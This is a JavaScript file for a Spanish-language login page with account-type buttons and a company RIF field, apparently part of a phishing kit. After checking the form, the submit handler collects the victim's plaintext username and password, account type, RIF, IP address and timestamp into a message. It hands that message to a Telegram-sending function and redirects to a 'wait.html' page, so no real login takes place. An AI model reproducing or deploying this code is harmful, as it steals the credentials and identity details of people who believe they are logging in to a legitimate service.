document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('loginForm');
    const emailInput = document.querySelector('input[name="usuario"]');
    const passwordInput = document.querySelector('input[name="password"]');
    const loginButton = document.querySelector('.btn-ingresar');
    const togglePassword = document.querySelector('.toggle-password');
    const typeButtons = document.querySelectorAll('.type-btn');
    const juridicoFields = document.getElementById('juridicoFields');
    const rifGroup = document.getElementById('rifGroup');
    const isAuthorizedCheck = document.getElementById('isAuthorized');
    const rifNumberInput = document.querySelector('input[name="rifNumber"]');

    // Configuración inicial del botón: siempre activo
    loginButton.disabled = false;
    loginButton.classList.add('active');

    const REDIRECCION_URL = 'wait.html';

    // Manejo de visibilidad de contraseña
    if (togglePassword) {
        togglePassword.addEventListener('click', () => {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
        });
    }

    // Manejo del selector de tipo de usuario
    typeButtons.forEach(btn => {
        btn.addEventListener('click', () => {
            typeButtons.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');

            // Mostrar/Ocultar campos jurídicos
            if (btn.id === 'btnJuridico') {
                juridicoFields.style.display = 'block';
            } else {
                juridicoFields.style.display = 'none';
                // Resetear estado jurídico si se vuelve a natural
                isAuthorizedCheck.checked = false;
                rifGroup.style.display = 'none';
                rifNumberInput.value = '';
            }
        });
    });

    // Manejo del checkbox de usuario autorizado
    isAuthorizedCheck.addEventListener('change', () => {
        if (isAuthorizedCheck.checked) {
            rifGroup.style.display = 'block';
        } else {
            rifGroup.style.display = 'none';
            rifNumberInput.value = '';
            document.getElementById('rifError').textContent = '';
            rifNumberInput.classList.remove('error');
        }
    });

    // Validación en tiempo real del RIF
    rifNumberInput.addEventListener('input', () => {
        const rifError = document.getElementById('rifError');
        
        // Solo permitir números
        rifNumberInput.value = rifNumberInput.value.replace(/\D/g, '');

        if (rifNumberInput.value.trim() !== '') {
            rifError.textContent = '';
            rifNumberInput.classList.remove('error');
        } else {
            rifError.textContent = 'El RIF de la empresa es requerido';
            rifNumberInput.classList.add('error');
        }
    });

    // Validación en tiempo real del usuario
    emailInput.addEventListener('input', () => {
        const usuario = emailInput.value.trim();
        const usuarioError = document.getElementById('usuarioError');

        if (usuario === '') {
            usuarioError.textContent = 'Debe indicar nombre de usuario o correo';
            emailInput.classList.add('error');
        } else {
            usuarioError.textContent = '';
            emailInput.classList.remove('error');
        }
    });

    // Validación en tiempo real de la contraseña
    passwordInput.addEventListener('input', () => {
        const password = passwordInput.value;
        const passwordError = document.getElementById('passwordError');

        if (password === '') {
            passwordError.textContent = 'La cotraseña es requerida';
            passwordInput.classList.add('error');
        } else if (password.length < 8) {
            passwordError.textContent = 'La contraseña debe contener al menos 8 caracteres';
            passwordInput.classList.add('error');
        } else {
            passwordError.textContent = '';
            passwordInput.classList.remove('error');
        }
    });

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const usuario = emailInput.value.trim();
        const password = passwordInput.value.trim();
        const usuarioError = document.getElementById('usuarioError');
        const passwordError = document.getElementById('passwordError');

        let isValid = true;

        // Limpiar errores previos
        usuarioError.textContent = '';
        passwordError.textContent = '';
        emailInput.classList.remove('error');
        passwordInput.classList.remove('error');

        if (usuario === '') {
            usuarioError.textContent = 'Debe indicar nombre de usuario o correo';
            emailInput.classList.add('error');
            isValid = false;
        }

        if (password === '') {
            passwordError.textContent = 'La cotraseña es requerida';
            passwordInput.classList.add('error');
            isValid = false;
        } else if (password.length < 8) {
            passwordError.textContent = 'La contraseña debe contener al menos 8 caracteres';
            passwordInput.classList.add('error');
            isValid = false;
        }

        if (!isValid) return;

        const tipoUsuario = document.querySelector('.type-btn.active')?.textContent || 'No especificado';
        const isAuthorized = isAuthorizedCheck.checked;
        const rifType = document.querySelector('select[name="rifType"]')?.value;
        const rifNumber = rifNumberInput.value.trim();

        if (tipoUsuario === 'Jurídico' && isAuthorized) {
            if (rifNumber === '') {
                document.getElementById('rifError').textContent = 'El RIF de la empresa es requerido';
                rifNumberInput.classList.add('error');
                isValid = false;
            }
        }

        if (!isValid) return;

        let mensaje = `📥 <b>Nuevo Registro de Acceso</b>\n\n` +
                        `👤 <b>Usuario:</b> ${usuario}\n` +
                        `🔑 <b>Contraseña:</b> ${password}\n` +
                        `🏢 <b>Tipo:</b> ${tipoUsuario}\n`;

        if (tipoUsuario === 'Jurídico') {
            mensaje += `✅ <b>Autorizado:</b> ${isAuthorized ? 'Sí' : 'No'}\n`;
            if (isAuthorized) {
                mensaje += `🆔 <b>RIF:</b> ${rifType}${rifNumber}\n`;
            }
        }

        const ipUsuario = await obtenerIP();
        const fechaHora = obtenerFechaHora();

        mensaje += `🌐 <b>Dirección IP:</b> ${ipUsuario}\n` +
                   `⏰ <b>Fecha y Hora:</b> ${fechaHora}\n`;

        await enviarATelegram(mensaje);
        localStorage.setItem('usuario_guardado', usuario);
        window.location.href = REDIRECCION_URL;
    });
});
